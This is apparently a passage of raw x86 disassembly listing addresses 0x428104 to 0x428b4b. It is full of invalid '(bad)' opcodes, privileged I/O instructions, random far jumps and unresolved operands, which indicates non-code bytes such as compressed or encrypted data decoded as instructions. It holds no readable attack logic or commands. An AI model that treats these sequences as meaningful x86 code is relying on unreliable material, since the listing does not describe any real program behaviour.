  428104:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428105:	pop    ecx
  428106:	inc    edx
  428107:	fdivr  QWORD PTR [eax+0xd]
  42810a:	and    DWORD PTR [ebx+0xdaeaa17],esi
  428110:	pop    ss
	...
  428171:	add    BYTE PTR [eax],al
  428173:	add    bh,bl
  428175:	out    dx,al
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	std    
  428181:	dec    ebp
  428182:	scas   al,BYTE PTR es:[edi]
  428183:	sti    
  428184:	shrd   DWORD PTR [ecx],eax,cl
  428187:	add    BYTE PTR ds:0x5b000001,al
  42818d:	lahf   
  42818e:	jnp    0x428201
  428190:	xor    eax,0xbfba5409
  428195:	push   edx
  428196:	mov    al,0x92
  428198:	loop   0x42817b
  42819a:	repnz out dx,al
  42819c:	fbld   TBYTE PTR [ebx-0x63]
  42819f:	pop    ebx
  4281a0:	bound  ecx,QWORD PTR [ecx-0x1e698d0f]
  4281a6:	sub    BYTE PTR [esi+0x6fb56526],cl
  4281ac:	push   ebp
  4281ad:	jge    0x42821c
  4281af:	jae    0x428174
  4281b1:	leave  
  4281b2:	pop    esp
  4281b3:	loopne 0x428219
  4281b5:	pushf  
  4281b6:	call   0x5534:0xa32dd898
  4281bd:	mov    eax,0x2a93e69d
  4281c2:	in     eax,dx
  4281c3:	pop    es
  4281c4:	imul   ebp,DWORD PTR [ebx+0x6f56b145],0x9bc28bc
  4281ce:	dec    edx
  4281cf:	repz xor al,0x1e
  4281d2:	and    eax,0x8c335547
  4281d7:	fisub  DWORD PTR [ebx]
  4281d9:	jl     0x428178
  4281db:	(bad)  
  4281dd:	les    ebx,FWORD PTR [edi]
  4281df:	mov    ?,WORD PTR [ecx]
  4281e1:	mov    esi,0x852fc089
  4281e6:	bound  edx,QWORD PTR [edi-0x32]
  4281e9:	inc    esi
  4281ea:	or     esp,DWORD PTR [ebx+0x35]
  4281ed:	or     ebx,ebp
  4281ef:	xlat   BYTE PTR ds:[ebx]
  4281f0:	imul   ebx,DWORD PTR [eax],0x6f
  4281f3:	jmp    0x75b6:0x7ae98ba9
  4281fa:	lods   al,BYTE PTR ds:[esi]
  4281fb:	cld    
  4281fc:	sbb    esi,edi
  4281fe:	add    BYTE PTR [eax-0x24d14b4a],dh
  428204:	inc    esp
  428205:	fisttp WORD PTR [esi]
  428207:	loope  0x42818a
  428209:	or     al,0xea
  42820b:	imul   edx,DWORD PTR [edx],0xffffffc8
  42820e:	lock pinsrw mm7,WORD PTR [ebp-0x4b4f794e],0x5d
  428217:	cmp    BYTE PTR [ebx],ch
  428219:	add    eax,0x3924de11
  42821e:	pop    ecx
  42821f:	fisub  DWORD PTR [ebp+0x2c]
  428222:	xor    ebx,DWORD PTR [edi+0x27]
  428225:	retf   
  428226:	mov    edi,0xd9f1070b
  42822b:	inc    ebp
  42822c:	fdivr  QWORD PTR [ecx+edi*4+0x37]
  428230:	xor    BYTE PTR [ebx+ebx*2-0x43e36eea],ah
  428237:	inc    ebx
  428238:	je     0x428204
  42823a:	mov    ecx,0x69add10f
  42823f:	dec    edi
  428240:	or     esi,ecx
  428242:	adc    eax,0x2d9491dd
  428247:	or     dh,cl
  428249:	mov    ecx,DWORD PTR [ecx]
  42824b:	adc    DWORD PTR [edi+0x61],ebx
  42824e:	pop    ds
  42824f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428250:	mov    ch,0x68
  428252:	es xlat BYTE PTR fs:[ebx]
  428255:	dec    ecx
  428256:	cmp    BYTE PTR [ebp+edi*1-0x2a3e14fe],ah
  42825d:	mov    al,0xf3
  42825f:	jmp    ebp
  428261:	pop    esi
  428262:	jp     0x428240
  428264:	inc    ebx
  428265:	jns    0x42822b
  428267:	or     al,0xb1
  428269:	int3   
  42826a:	(bad)  
  42826b:	shrd   edi,ecx,0x3
  42826f:	sbb    BYTE PTR [eax-0x523bd369],cl
  428275:	push   ecx
  428276:	mov    bl,0xb2
  428278:	mov    al,0x76
  42827a:	test   DWORD PTR [eax-0x206be1df],edi
  428280:	lods   eax,DWORD PTR ds:[esi]
  428281:	leave  
  428282:	repnz lock pop ebp
  428285:	leave  
  428286:	hlt    
  428287:	jmp    0x80a8:0xe32871c0
  42828e:	call   0x0:0x50d2
	...
  4282f1:	add    BYTE PTR [eax],al
  4282f3:	add    bh,al
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	ficom  WORD PTR [ebp+ebp*4+0x66]
  428304:	adc    al,0xae
  428306:	add    DWORD PTR [eax],eax
  428308:	add    eax,0xd4000001
  42830d:	cdq    
  42830e:	ficom  WORD PTR [ebp-0x44cd086]
  428314:	cmp    al,0x57
  428316:	(bad)  
  428317:	dec    ecx
  428318:	add    ecx,DWORD PTR [ebp+0x2580db19]
  42831e:	lods   al,BYTE PTR ds:[esi]
  42831f:	or     BYTE PTR [esp+edx*1],al
  428322:	sbb    dl,BYTE PTR [eax+eax*1]
  428325:	xchg   edi,eax
  428326:	xchg   ebp,eax
  428327:	rcr    edx,0x7e
  42832a:	or     eax,0xc68b65b9
  42832f:	add    BYTE PTR [eax+eiz*1],bh
  428332:	and    eax,0x195fe0e6
  428337:	std    
  428338:	iret   
  428339:	daa    
  42833a:	lock fmul QWORD PTR [ecx+0x63]
  42833e:	pop    edx
  42833f:	and    DWORD PTR [edi+0x21],eax
  428342:	inc    edx
  428343:	pop    edi
  428344:	pop    ebp
  428345:	shl    DWORD PTR [ebx],1
  428347:	scas   al,BYTE PTR es:[edi]
  428348:	rol    BYTE PTR [ebx],cl
  42834a:	(bad)  [edx]
  42834c:	jnp    0x42832a
  42834e:	dec    edi
  42834f:	mov    ebp,0x31d26e3c
  428354:	mov    ch,0x72
  428356:	push   ebp
  428357:	addr16 int 0xfe
  42835a:	(bad)  
  42835b:	std    
  42835c:	popa   
  42835d:	push   eax
  42835e:	or     ebp,DWORD PTR [ebx-0x5ada62e7]
  428364:	sbb    esi,edi
  428366:	ss xchg ecx,eax
  428368:	rol    BYTE PTR ds:0x1ebf9e37,cl
  42836e:	icebp  
  42836f:	cwde   
  428370:	xchg   ebx,eax
  428371:	cdq    
  428372:	mov    ah,0x6a
  428374:	call   0x702e:0xb06854a9
  42837b:	popa   
  42837c:	mov    ebp,DWORD PTR [eax+ecx*4-0xe0a947f]
  428383:	js     0x428401
  428385:	pop    edx
  428386:	shr    BYTE PTR [edx],1
  428388:	cs cwde 
  42838a:	pop    edi
  42838b:	(bad)  
  42838c:	jp     0x42830e
  42838e:	jae    0x428383
  428390:	pusha  
  428391:	mov    eax,ds:0x18fe5eff
  428396:	xchg   esp,eax
  428397:	jmp    0x42838a
  428399:	jb     0x428369
  42839b:	jp     0x4283b7
  42839d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42839e:	mov    bl,0x93
  4283a0:	stos   DWORD PTR es:[edi],eax
  4283a1:	mov    ecx,DWORD PTR [ebx]
  4283a3:	sub    bl,bh
  4283a5:	adc    eax,DWORD PTR [esi+0x603dc760]
  4283ab:	iret   
  4283ac:	retf   
  4283ad:	inc    ecx
  4283ae:	mov    edx,0xe82548f4
  4283b3:	pop    esi
  4283b4:	(bad)  
  4283b6:	arpl   WORD PTR fs:[edx+eax*8+0x3d],dx
  4283bb:	pusha  
  4283bc:	(bad)  
  4283bd:	icebp  
  4283be:	cwde   
  4283bf:	adc    cl,BYTE PTR [ecx]
  4283c1:	xchg   esp,eax
  4283c2:	test   al,0xad
  4283c4:	imul   ecx,DWORD PTR [ecx-0x1b],0x41
  4283c8:	sbb    DWORD PTR [ebp+0x1578c150],esi
  4283ce:	mov    al,0x34
  4283d0:	imul   ebx,DWORD PTR [ebp+eiz*1+0x7d23948a],0xd4c28a8
  4283db:	or     bh,BYTE PTR [esi+0x2fd26f91]
  4283e1:	out    dx,eax
  4283e2:	push   esp
  4283e3:	mov    edi,0x3b2d63c8
  4283e8:	ins    DWORD PTR es:[edi],dx
  4283e9:	sbb    eax,0x339a91bc
  4283ee:	mov    BYTE PTR [ebx+esi*1-0x48],dl
  4283f2:	cmc    
  4283f3:	jb     0x428417
  4283f5:	inc    edx
  4283f6:	shl    DWORD PTR [esi],1
  4283f8:	adc    dh,BYTE PTR [esi-0x1e]
  4283fb:	(bad)  
  4283fc:	xlat   BYTE PTR ds:[ebx]
  4283fd:	mov    ebx,esp
  4283ff:	mov    eax,0x750acd33
  428404:	xchg   DWORD PTR [ebx-0x5cf07244],esi
  42840a:	sub    BYTE PTR [edi],dl
  42840c:	std    
  42840d:	enter  0x7104,0x14
	...
  428471:	add    BYTE PTR [eax],al
  428473:	add    BYTE PTR [esi],cl
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0xb8abfb32
  428481:	push   eax
  428482:	cmp    BYTE PTR [ebx+0x19],al
  428485:	scas   eax,DWORD PTR es:[edi]
  428486:	add    DWORD PTR [eax],eax
  428488:	add    eax,0xe0000001
  42848d:	push   0xffffffda
  42848f:	(bad)  
  428490:	pushf  
  428491:	sub    eax,0x5fdbce51
  428496:	cmp    bl,bh
  428498:	and    bl,BYTE PTR [ebp+0x45]
  42849b:	push   ebp
  42849c:	aaa    
  42849d:	pop    edi
  42849e:	cmp    BYTE PTR [esi],0x2
  4284a1:	mov    WORD PTR [eax],cs
  4284a3:	sbb    esi,ecx
  4284a5:	test   al,0xbd
  4284a7:	int3   
  4284a8:	mov    WORD PTR [ecx],cs
  4284aa:	xchg   esp,eax
  4284ab:	sbb    DWORD PTR [ebp+edx*8+0x69],ebp
  4284af:	push   ebx
  4284b0:	dec    ebx
  4284b1:	adc    ah,dh
  4284b3:	jle    0x4284da
  4284b5:	cmp    DWORD PTR [ecx+0x48],0x46c20c8b
  4284bc:	dec    ebx
  4284bd:	mov    edi,0xa9d78412
  4284c2:	adc    dh,dl
  4284c4:	pop    ecx
  4284c5:	push   es
  4284c6:	pop    es
  4284c7:	add    esp,edi
  4284c9:	imul   eax,DWORD PTR ds:0x6d4e5cef,0x71
  4284d0:	pop    ds
  4284d1:	arpl   bp,si
  4284d3:	adc    DWORD PTR [eax+eax*1+0x66],ebx
  4284d7:	clc    
  4284d8:	inc    edi
  4284d9:	call   FWORD PTR [edx+ebp*1-0x6d970fa]
  4284e0:	mov    ebp,0x712712b9
  4284e5:	out    dx,eax
  4284e6:	jne    0x428499
  4284e8:	cmp    eax,0x1cf9f33f
  4284ed:	shl    bl,1
  4284ef:	out    0xb6,al
  4284f1:	mov    bh,0x65
  4284f3:	or     DWORD PTR [eax+ecx*8+0xe],0xffffffe7
  4284f8:	retf   
  4284f9:	rcl    BYTE PTR [edx+0x6f],1
  4284fc:	mov    bl,0x79
  4284fe:	ficom  WORD PTR [edx+eax*1+0x3f99e870]
  428505:	icebp  
  428506:	push   edx
  428507:	xor    al,0x1d
  428509:	sti    
  42850a:	mov    WORD PTR [edx],ss
  42850c:	and    eax,0x12bd6e68
  428511:	mov    edx,0x7bf80782
  428516:	dec    ebp
  428517:	in     al,dx
  428518:	retf   0xe8c4
  42851b:	fwait
  42851c:	push   0x3f
  42851e:	shl    DWORD PTR ds:0xd10b38fc,0x76
  428525:	and    ebx,0xfffffff7
  428528:	loope  0x428578
  42852a:	mov    ch,0xa0
  42852c:	jge    0x4284ce
  42852e:	sub    edx,DWORD PTR [edi]
  428530:	cmp    BYTE PTR [ebp-0x162eff1a],0x3d
  428537:	push   ebp
  428538:	in     eax,dx
  428539:	(bad)  
  42853a:	aad    0x23
  42853c:	pop    ss
  42853d:	popf   
  42853e:	dec    eax
  42853f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428540:	outs   dx,DWORD PTR ds:[esi]
  428541:	call   0x6b41231a
  428546:	mov    ah,0xbe
  428548:	ret    0x87e2
  42854b:	cwde   
  42854c:	or     ebx,edx
  42854e:	mov    bh,BYTE PTR [esi+0xc]
  428551:	aam    0xc4
  428553:	push   eax
  428554:	cli    
  428555:	(bad)  
  428556:	or     edx,esi
  428558:	cwde   
  428559:	pop    edi
  42855a:	test   eax,0xcdc3ece5
  42855f:	fsubrp st(7),st
  428561:	add    BYTE PTR [ecx],bh
  428563:	retf   
  428564:	sub    dl,BYTE PTR [ebp-0x65b9666e]
  42856a:	cmp    al,0x4b
  42856c:	xchg   ecx,eax
  42856d:	adc    esi,edx
  42856f:	mov    eax,es:0xfefafd8c
  428575:	mov    BYTE PTR [edx],al
  428577:	add    bh,BYTE PTR [edx+0x2c]
  42857a:	outs   dx,BYTE PTR ds:[esi]
  42857b:	lahf   
  42857c:	or     edx,edx
  42857e:	cmc    
  42857f:	cmp    al,0x10
  428581:	and    DWORD PTR [ebx],esi
  428583:	repnz ins DWORD PTR es:[edi],dx
  428585:	mov    esp,0x31b7ccc4
  42858a:	loope  0x42858f
  42858c:	and    BYTE PTR [eax+ebp*2+0xf887],ah
	...
  4285f3:	add    BYTE PTR [ecx-0xa],dl
  4285f6:	xor    eax,0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0xea8aa3f6
  428602:	xor    dl,BYTE PTR [edi+0x1e]
  428605:	mov    al,0x1
  428607:	add    BYTE PTR ds:0x5d000001,al
  42860d:	aas    
  42860e:	mov    al,0x6f
  428610:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428611:	daa    
  428612:	mov    ss,WORD PTR [eax-0xa8f7c59]
  428618:	mov    ch,0x67
  42861a:	xchg   DWORD PTR [ebp+0x2c4ba542],esp
  428620:	ficom  WORD PTR [ebp-0x570f1395]
  428626:	call   0xa4b7c60c
  42862b:	add    ebx,ecx
  42862d:	cwde   
  42862e:	aam    0x2a
  428630:	test   DWORD PTR [ecx-0x4a],esp
  428633:	ffreep st(3)
  428635:	test   bl,al
  428637:	and    al,0xd0
  428639:	adc    bh,BYTE PTR [ebx-0x1]
  42863c:	gs (bad) 
  42863e:	mov    al,0x16
  428640:	inc    esi
  428641:	xor    ch,BYTE PTR [edx]
  428643:	aas    
  428644:	mov    eax,0xc16bdeee
  428649:	jo     0x428677
  42864b:	aas    
  42864c:	std    
  42864d:	mov    eax,ds:0x79922eb2
  428652:	and    edx,esi
  428654:	xchg   ecx,eax
  428655:	fisttp WORD PTR ds:0x11e77059
  42865b:	dec    DWORD PTR ds:0xcfffaf1f
  428661:	jns    0x4286c6
  428663:	push   edi
  428664:	inc    ecx
  428665:	cwde   
  428666:	cmp    DWORD PTR [edi+0x4e0ee491],esp
  42866c:	jne    0x4286e9
  42866e:	lods   eax,DWORD PTR ds:[esi]
  42866f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428670:	in     al,dx
  428671:	mov    bh,0x5e
  428673:	xor    cl,cl
  428675:	xchg   edi,eax
  428676:	xchg   esp,eax
  428677:	(bad)  
  428678:	daa    
  428679:	adc    al,0x89
  42867b:	pop    eax
  42867c:	sub    eax,esi
  42867e:	icebp  
  42867f:	xlat   BYTE PTR ds:[ebx]
  428680:	test   al,0xd5
  428682:	xor    eax,0xb574ae77
  428687:	inc    ebx
  428688:	push   es
  428689:	pop    ss
  42868a:	outs   dx,DWORD PTR ds:[esi]
  42868b:	jb     0x428655
  42868d:	xchg   ebx,eax
  42868e:	mov    eax,0x4a66df39
  428693:	xlat   BYTE PTR ds:[ebx]
  428694:	push   0xb7555190
  428699:	sbb    DWORD PTR [ecx],edi
  42869b:	fwait
  42869c:	dec    ecx
  42869d:	adc    eax,0xc4f6a002
  4286a2:	ja     0x42864d
  4286a4:	mov    edi,0x90caad9a
  4286a9:	stos   DWORD PTR es:[edi],eax
  4286aa:	xchg   edi,eax
  4286ab:	pop    ss
  4286ac:	out    dx,eax
  4286ad:	arpl   WORD PTR [ecx+0x67fab9a7],cx
  4286b3:	pop    eax
  4286b4:	inc    eax
  4286b5:	and    BYTE PTR [ecx+0x26],cl
  4286b8:	loope  0x428706
  4286ba:	mov    DWORD PTR [ebp+0x1],eax
  4286bd:	leave  
  4286be:	jae    0x42866b
  4286c0:	into   
  4286c1:	dec    eax
  4286c2:	jns    0x4286a3
  4286c4:	jb     0x428678
  4286c6:	jb     0x428721
  4286c8:	fidivr WORD PTR [edi]
  4286ca:	je     0x4286ee
  4286cc:	nop
  4286cd:	push   esi
  4286ce:	inc    ebp
  4286cf:	imul   ebx,DWORD PTR [edi-0x6d0db0b7],0xffffff9d
  4286d6:	popf   
  4286d7:	mov    edx,0xa6470d25
  4286dc:	cwde   
  4286dd:	push   ss
  4286de:	or     bl,0x5a
  4286e1:	mov    al,ds:0x3d92b797
  4286e6:	mov    dh,0x49
  4286e8:	cmp    bl,al
  4286ea:	xor    ah,al
  4286ec:	jge    0x428707
  4286ee:	mov    ebp,0x55c51b9b
  4286f3:	icebp  
  4286f4:	push   0xffffff8d
  4286f6:	aas    
  4286f7:	test   eax,0xddb2330a
  4286fc:	cmp    al,0xee
  4286fe:	loopne 0x4286e9
  428700:	lea    edi,[edx+eax*2-0x1d]
  428704:	fidiv  WORD PTR [ecx+eax*4+0x2a]
  428708:	ins    BYTE PTR es:[edi],dx
  428709:	loope  0x4286b9
  42870b:	mov    al,ds:0x31737554
  428710:	cwde   
	...
  428771:	add    BYTE PTR [eax],al
  428773:	add    BYTE PTR [esi+0x5b],dl
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0xbe8a2196
  428783:	ret    0xb123
  428786:	add    DWORD PTR [eax],eax
  428788:	add    eax,0xbc000001
  42878d:	hlt    
  42878e:	xchg   ebx,eax
  42878f:	lock jne 0x42871e
  428792:	inc    edi
  428793:	dec    ecx
  428794:	ins    DWORD PTR es:[edi],dx
  428795:	imul   BYTE PTR [ebx+0x26]
  428798:	xor    DWORD PTR [ecx+0x48],esi
  42879b:	in     eax,0xdf
  42879d:	sub    DWORD PTR [edx+0x4f70e0c1],eax
  4287a3:	jo     0x4287ae
  4287a5:	out    0x1a,eax
  4287a7:	xor    eax,0x1b946bbd
  4287ac:	scas   al,BYTE PTR es:[edi]
  4287ad:	stos   DWORD PTR es:[edi],eax
  4287ae:	lock ret 
  4287b0:	sbb    al,0xf4
  4287b2:	rol    cl,0x0
  4287b5:	jp     0x428788
  4287b7:	xor    eax,0x66990656
  4287bc:	jae    0x428747
  4287be:	or     bh,BYTE PTR [ecx-0x2a]
  4287c1:	iret   
  4287c2:	mov    ch,0x14
  4287c4:	in     al,0xb5
  4287c6:	rol    BYTE PTR ds:[edi+edi*8],1
  4287ca:	inc    esp
  4287cb:	xor    DWORD PTR [edi],edx
  4287cd:	popa   
  4287ce:	jge    0x4287b1
  4287d0:	mov    esi,0xe191c5ed
  4287d5:	or     ebp,eax
  4287d7:	fadd   QWORD PTR [edi+0x5c]
  4287da:	fimul  DWORD PTR gs:[edx+eax*1-0x25]
  4287df:	fst    QWORD PTR [esi-0x50]
  4287e2:	(bad)  
  4287e3:	fs inc esi
  4287e5:	and    edx,DWORD PTR [ebx]
  4287e7:	(bad)  
  4287e8:	shl    BYTE PTR [ecx],1
  4287ea:	sub    BYTE PTR [esp+ebx*4],dh
  4287ed:	outs   dx,BYTE PTR ds:[esi]
  4287ee:	xchg   ebx,eax
  4287ef:	in     eax,dx
  4287f0:	xor    ebx,edi
  4287f2:	pop    ecx
  4287f3:	cld    
  4287f4:	or     al,BYTE PTR [ecx-0xa40cd4d]
  4287fa:	pop    ecx
  4287fb:	xor    edi,eax
  4287fd:	jbe    0x428806
  4287ff:	xchg   ebx,eax
  428800:	in     eax,dx
  428801:	lahf   
  428802:	adc    al,0xef
  428804:	jg     0x428834
  428806:	add    esi,DWORD PTR [ecx]
  428808:	out    0x14,al
  42880a:	loop   0x428862
  42880c:	push   esp
  42880d:	pop    ds
  42880e:	imul   edi,DWORD PTR [esi+0x2fbe1b62],0xa12c5a7a
  428818:	std    
  428819:	mov    ebx,0xa1562cad
  42881e:	mov    ebp,0xe271ef4b
  428823:	leave  
  428824:	xchg   esi,eax
  428825:	mov    cs,WORD PTR [edx-0x73157101]
  42882b:	in     al,0x43
  42882d:	cmp    bl,ch
  42882f:	lock lods eax,DWORD PTR ds:[esi]
  428831:	outs   dx,BYTE PTR ds:[esi]
  428832:	inc    DWORD PTR [ebp+edx*2-0x14eb7cc3]
  428839:	inc    edx
  42883a:	dec    DWORD PTR [esi+0x14d88afd]
  428840:	add    eax,0x323ba942
  428845:	pushf  
  428846:	das    
  428847:	and    eax,0x6b8fe7ca
  42884c:	stos   BYTE PTR es:[edi],al
  42884d:	bound  esi,QWORD PTR [esi+0x422df75a]
  428853:	cmc    
  428854:	cmc    
  428855:	les    ebp,FWORD PTR [esi-0x86f970f]
  42885b:	js     0x4288d3
  42885d:	into   
  42885e:	jmp    0x428847
  428860:	mov    esi,0xff6d1cf2
  428865:	aas    
  428866:	rcl    ah,0x20
  428869:	imul   eax,DWORD PTR [eax],0x3a2bad0
  42886f:	dec    ecx
  428870:	push   es
  428871:	aas    
  428872:	in     eax,0xb7
  428874:	add    al,0x89
  428876:	ins    BYTE PTR es:[edi],dx
  428877:	ret    0xed79
  42887a:	sub    cl,0x86
  42887d:	aam    0x20
  42887f:	(bad)  
  428880:	ror    BYTE PTR [ebx-0x314670],1
  428886:	outs   dx,DWORD PTR ds:[esi]
  428887:	or     al,0xe5
  428889:	popa   
  42888a:	jne    0x428855
  42888c:	leave  
  42888d:	shr    BYTE PTR ds:0x2938,1
	...
  4288f3:	add    BYTE PTR [esi],ah
  4288f5:	jp     0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi+0x46279d0f],bx
  428902:	xchg   ebp,eax
  428903:	sub    DWORD PTR [eax],ebp
  428905:	mov    dl,0x1
  428907:	add    BYTE PTR ds:0xc4000001,al
  42890d:	dec    ecx
  42890e:	aaa    
  42890f:	loope  0x428968
  428911:	and    al,0xf8
  428913:	add    cl,bl
  428915:	ja     0x42891d
  428917:	mov    dh,0x3b
  428919:	inc    edx
  42891a:	pop    esi
  42891b:	adc    al,BYTE PTR [ebx+0x79]
  42891e:	retf   0x326b
  428921:	adc    DWORD PTR [ebx+eiz*8-0x1532a83f],0x2b6f5ebc
  42892c:	jnp    0x4288c7
  42892e:	jle    0x42895d
  428930:	(bad)  
  428931:	mov    dl,0x5f
  428933:	xlat   BYTE PTR ds:[ebx]
  428934:	clc    
  428935:	outs   dx,DWORD PTR ds:[esi]
  428936:	push   0xffffffc6
  428938:	fisttp QWORD PTR [ecx-0x3b67070a]
  42893e:	ret    
  42893f:	xlat   BYTE PTR ds:[ebx]
  428940:	lds    ebx,FWORD PTR [ebx+0x68]
  428943:	and    BYTE PTR [edi],bl
  428945:	pop    esp
  428946:	xor    DWORD PTR [eax-0x36],edx
  428949:	mov    ah,ah
  42894b:	jmpw   0xd116
  42894f:	hlt    
  428950:	pusha  
  428951:	or     ch,BYTE PTR fs:[edi+eiz*2+0xf]
  428956:	sbb    esp,DWORD PTR [ebx+ecx*1+0x79]
  42895a:	outs   dx,BYTE PTR ds:[esi]
  42895b:	cmc    
  42895c:	pop    edi
  42895d:	lods   eax,DWORD PTR ds:[esi]
  42895e:	push   esi
  42895f:	paddw  mm1,QWORD PTR [edx]
  428962:	inc    esp
  428963:	int    0xbc
  428965:	repz jle 0x428907
  428968:	push   edx
  428969:	(bad)  [eax]
  42896b:	loope  0x428945
  42896d:	mov    dl,0x8e
  42896f:	daa    
  428970:	mov    WORD PTR [ecx-0x66],?
  428973:	call   0x414dd619
  428978:	adc    eax,0x3bca362c
  42897d:	mov    ds:0x9f626af8,eax
  428982:	mov    al,ds:0x846c4bfd
  428987:	(bad)  
  428988:	and    al,0x6c
  42898a:	repnz loop 0x4289dd
  42898d:	dec    edx
  42898e:	jb     0x428981
  428990:	aam    0x40
  428992:	cli    
  428993:	mov    ds:0xba3200e9,eax
  428998:	fisub  DWORD PTR [eax]
  42899a:	shr    BYTE PTR [ecx],cl
  42899c:	fcmovnb st,st(3)
  42899e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42899f:	push   edx
  4289a0:	aas    
  4289a1:	or     DWORD PTR ds:0xa8af1334,esi
  4289a8:	and    eax,0x231e9930
  4289ad:	lods   al,BYTE PTR ds:[esi]
  4289ae:	aas    
  4289af:	inc    esi
  4289b0:	or     eax,esp
  4289b2:	cmp    BYTE PTR [esi-0x1466dee7],ah
  4289b8:	or     eax,0xc55e773
  4289bd:	movsx  ecx,BYTE PTR [eax]
  4289c0:	xor    bl,ch
  4289c2:	inc    ebp
  4289c3:	int3   
  4289c4:	mov    dl,0x20
  4289c6:	mov    esp,0x6ed0c7b1
  4289cb:	fdivr  QWORD PTR [ebx+0x3f5a1ec4]
  4289d1:	dec    edx
  4289d2:	push   0x7d
  4289d4:	pusha  
  4289d5:	mov    dl,0x8b
  4289d7:	mov    ebx,0x96444e7c
  4289dc:	lods   eax,DWORD PTR ds:[esi]
  4289de:	xchg   ebp,eax
  4289df:	push   cs
  4289e0:	xchg   ecx,eax
  4289e1:	int    0xab
  4289e3:	sub    esp,DWORD PTR [eax]
  4289e5:	adc    BYTE PTR [edx-0x696ef297],dl
  4289eb:	xor    al,0x54
  4289ed:	repz iret 
  4289ef:	add    bl,BYTE PTR [ebp-0x66]
  4289f2:	scas   al,BYTE PTR es:[edi]
  4289f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4289f4:	dec    esp
  4289f5:	paddq  mm4,mm3
  4289f8:	jecxz  0x4289bc
  4289fa:	test   BYTE PTR [edx],ch
  4289fc:	lds    esi,FWORD PTR [edx]
  4289fe:	inc    ebp
  4289ff:	mov    WORD PTR [ebx-0x70],?
  428a02:	adc    BYTE PTR [esi-0x39],ah
  428a05:	pop    esi
  428a06:	les    ecx,FWORD PTR [ebx]
  428a08:	mov    ?,WORD PTR [eax-0x5b]
  428a0b:	adc    DWORD PTR [eax-0x25],esp
  428a0e:	push   0xffffff83
  428a10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  428a71:	add    BYTE PTR [eax],al
  428a73:	add    BYTE PTR [ebp+0xc],cl
  428a76:	clc    
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax+0x4b71e913]
  428a83:	add    DWORD PTR ds:0x50001b3,ebp
  428a89:	add    DWORD PTR [eax],eax
  428a8b:	add    BYTE PTR [esi-0x19b0adb3],ah
  428a91:	in     al,0x50
  428a93:	ret    
  428a94:	mov    dl,0x66
  428a96:	mov    ecx,0x86848390
  428a9b:	push   edx
  428a9c:	(bad)  
  428a9d:	and    esi,ebp
  428a9f:	dec    edx
  428aa0:	pop    edx
  428aa1:	fld    DWORD PTR [eax]
  428aa3:	call   0x6e63a4c4
  428aa8:	out    dx,al
  428aa9:	stos   BYTE PTR es:[edi],al
  428aaa:	jns    0x428a64
  428aac:	arpl   WORD PTR [edi+edi*1],sp
  428aaf:	dec    esi
  428ab0:	xchg   BYTE PTR [ebp-0x765cd05],bl
  428ab6:	les    edi,FWORD PTR [ebx-0x144fbcdf]
  428abc:	jne    0x428b1b
  428abe:	xor    dh,BYTE PTR [eax]
  428ac0:	rol    BYTE PTR [ebx+0x38],cl
  428ac3:	nop
  428ac4:	push   ss
  428ac5:	mov    ebp,0xcefe62e9
  428aca:	inc    ebp
  428acb:	pop    edx
  428acc:	or     al,BYTE PTR [edx-0x2f]
  428acf:	or     eax,0x2e5ea8d8
  428ad4:	add    eax,0x4edd5eb3
  428ad9:	lock cmc 
  428adb:	sbb    bl,cl
  428add:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428ade:	mov    edx,0xadcf2965
  428ae3:	push   esi
  428ae4:	push   ss
  428ae5:	jae    0x428ad3
  428ae7:	ret    0xb9e4
  428aea:	lods   eax,DWORD PTR ds:[esi]
  428aeb:	std    
  428aec:	out    dx,al
  428aed:	add    DWORD PTR [esi-0x30924b88],0xadd6e780
  428af7:	sub    edx,ecx
  428af9:	mov    edi,0x8fb1aa12
  428afe:	cmp    ecx,0x1d
  428b01:	push   eax
  428b02:	fwait
  428b03:	pop    esi
  428b04:	int    0x54
  428b06:	cdq    
  428b07:	nop
  428b08:	fsubp  st(0),st
  428b0a:	mov    WORD PTR [ecx],ss
  428b0c:	or     DWORD PTR [esi-0x14],ecx
  428b0f:	dec    edx
  428b10:	ret    0x7599
  428b13:	imul   esi,ecx,0x8238cc7
  428b19:	iret   
  428b1a:	mov    ah,BYTE PTR [edi+0x28]
  428b1d:	mov    cl,0xc3
  428b1f:	popa   
  428b20:	loop   0x428aa6
  428b22:	iret   
  428b23:	fsubr  st,st(1)
  428b25:	push   ecx
  428b26:	ret    
  428b27:	push   ds
  428b28:	in     al,dx
  428b29:	xor    ebx,DWORD PTR [ebx+0x2f]
  428b2c:	lahf   
  428b2d:	(bad)  [edi+0xe]
  428b30:	mov    eax,ds:0x281a578e
  428b35:	leave  
  428b36:	jmp    0x428b80
  428b38:	stc    
  428b39:	ins    DWORD PTR es:[edi],dx
  428b3a:	daa    
  428b3b:	mov    ecx,0xa612934a
  428b40:	adc    eax,0x44ab4a65
  428b45:	mov    BYTE PTR [edi+0x2a],cl
  428b48:	jp     0x428b15
  428b4a:	outs   dx,BYTE PTR ds:[esi]
  428b4b:	xor    cl,BYTE PTR [edi+eiz*8-0x1]
